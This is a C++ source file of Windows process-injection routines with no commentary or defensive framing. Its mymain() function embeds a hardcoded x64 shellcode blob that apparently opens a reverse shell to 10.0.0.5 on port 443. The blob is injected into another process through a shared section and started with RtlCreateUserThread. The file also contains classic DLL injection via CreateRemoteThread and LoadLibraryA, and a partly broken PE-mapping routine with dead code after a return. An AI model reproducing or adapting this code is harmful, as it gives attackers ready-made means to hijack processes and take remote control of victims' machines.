

#include <Windows.h>
#include "utils.h"
#include "LoadPE.h"
#include "inject.h"

#pragma comment(lib, "ntdll")

typedef NTSTATUS (__stdcall *ptrNtCreateSection)(
	          PHANDLE            SectionHandle,
	           ACCESS_MASK        DesiredAccess,
	 char * ObjectAttributes,
	 PLARGE_INTEGER     MaximumSize,
	           ULONG              SectionPageProtection,
	           ULONG              AllocationAttributes,
	 HANDLE             FileHandle
);

typedef  NTSTATUS (__stdcall * ptrNtMapViewOfSection)(
	                HANDLE          SectionHandle,
	                HANDLE          ProcessHandle,
	           PVOID* BaseAddress,
	                ULONG_PTR       ZeroBits,
	                SIZE_T          CommitSize,
	PLARGE_INTEGER  SectionOffset,
	           PSIZE_T         ViewSize,
	                char* InheritDisposition,
	                ULONG           AllocationType,
	                ULONG           Win32Protect
);

typedef NTSTATUS(NTAPI* ptrRtlCreateUserThread)(IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits OPTIONAL,
	IN SIZE_T StackReserve OPTIONAL,
	IN SIZE_T StackCommit OPTIONAL,
	IN PTHREAD_START_ROUTINE StartAddress,
	IN PVOID Parameter OPTIONAL,
	OUT PHANDLE ThreadHandle OPTIONAL,
	OUT char* ClientId OPTIONAL);


int inject(int pid,char * szfunc) {
	int ret = 0;

	//execFunction((char*)"mytestfunc");

	HMODULE hm = LoadLibraryA("ntdll.dll");
	ptrNtCreateSection lpNtCreateSection = 0;
	ptrNtMapViewOfSection lpNtMapViewOfSection=0;
	ptrRtlCreateUserThread lpRtlCreateUserThread=0;
	if (hm) {
		lpNtCreateSection = (ptrNtCreateSection)GetProcAddress(hm, "NtCreateSection");
		lpNtMapViewOfSection = (ptrNtMapViewOfSection)GetProcAddress(hm, "NtMapViewOfSection");
		lpRtlCreateUserThread = (ptrRtlCreateUserThread)GetProcAddress(hm, "RtlCreateUserThread");
	}

	HMODULE hmodule = GetModuleHandleA(0);
	//ptrfunction lpfunc = (ptrfunction)GetProcAddress(hmodule, szfunc);

	HANDLE sectionHandle;
	LARGE_INTEGER sectionSize;
	sectionSize.HighPart = 0;
	sectionSize.LowPart = LoadPE::GetSizeOfImage((char*)hmodule)*4;

	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	ret = lpNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
		NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	ret = lpNtMapViewOfSection(sectionHandle, GetCurrentProcess(),(PVOID*)&localSectionAddress,
		NULL, NULL, NULL, (SIZE_T*)&sectionSize.LowPart, (char*)2, NULL, PAGE_READWRITE);

	HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS,0, pid);

	ret = lpNtMapViewOfSection(sectionHandle, hp, (PVOID*)&remoteSectionAddress,
		NULL, NULL, NULL,(SIZE_T*) &sectionSize.LowPart, (char*)2, NULL, PAGE_READWRITE);

	//memcpy(localSectionAddress, (char*)hmodule, sectionSize.LowPart);
	char szfn[1024];
	ret = GetModuleFileNameA(0, szfn, sizeof(szfn));
	lstrcpyA(szfn, (char*)"d:\\vsProject\\write.exe");

	HANDLE hf = CreateFileA(szfn, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	int filesize = 0;
	filesize = GetFileSize(hf,0);
	DWORD dwcnt = 0;
	char* buf = new char[filesize *16];
	char* filebuf = (char*)(((DWORD)buf + 0x10000)/ 0x10000 * 0x10000);
	ret = ReadFile(hf, filebuf, filesize, &dwcnt, 0);
	CloseHandle(hf);

	char* buf2 = new char[filesize * 16];
	//remoteSectionAddress = (char*)(((DWORD)buf2 + 0x10000) / 0x10000 * 0x10000);

	ret = LoadPE::MapFile((char*)filebuf, (char*)localSectionAddress);
	ret = LoadPE::RelocationTable((char*)localSectionAddress,(char*) remoteSectionAddress);
	ret = LoadPE::ImportTable((char*)localSectionAddress);

	ret = LoadPE::SetImageBase((char*)localSectionAddress);

	//LPVOID lpfunc = (LPVOID)LoadPE::getAddrFromName((char*)localSectionAddress, szfunc);

	DWORD oldprotect = 0;
	ret = VirtualProtect((LPVOID)localSectionAddress, LoadPE::GetSizeOfImage((char*)hmodule),
		PAGE_EXECUTE_READWRITE, &oldprotect);

	//ProcWinMain lpfuncmain = (ProcWinMain)LoadPE::getEntry((char*)remoteSectionAddress);

	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)localSectionAddress;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((char*)localSectionAddress + pDos->e_lfanew);
	ProcWinMain lpfuncmain = (ProcWinMain)((char*)localSectionAddress + pNt->OptionalHeader.AddressOfEntryPoint);
	lpfuncmain(0,0,0,0);

	return ret;

	HANDLE targetThreadHandle = NULL;
	lpRtlCreateUserThread(hp, NULL, FALSE, 0, 0, 0,(LPTHREAD_START_ROUTINE) remoteSectionAddress,
		NULL, &targetThreadHandle, NULL);

}


typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);

int mymain()
{
	unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x00\x05\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";

	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
		(PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress,
		NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// create a view of the memory section in the target process
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 4080);
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress,
		NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, buf, sizeof(buf));

	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

	return 0;
}




int RemoteInject(int pid) {
	int ret = 0;

	string curpath = GetCurPath();
	string dll64path = curpath + "qflwork64.dll";
	string dllpath = curpath + "qflwork.dll";

	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (h) {
		int is64 = IsProc64Bit(h);

		LPVOID addr = VirtualAllocEx(h, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (addr == NULL)
			return -1;

		SIZE_T realBytes = 0;
		if (is64) {
			ret = WriteProcessMemory(h, addr, dll64path.c_str(), dll64path.length(), &realBytes);
		}
		else {
			ret = WriteProcessMemory(h, addr, dllpath.c_str(), dllpath.length(), &realBytes);
		}
		
		DWORD threadId;
		HANDLE hThread = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, addr, 0, &threadId);
		if (hThread) {
			WaitForSingleObject(hThread, -1);
			CloseHandle(hThread);
		}
		
		VirtualFreeEx(h, addr, NULL, MEM_RELEASE);

		CloseHandle(h);	
		return threadId;
	}

	return 0;
	
}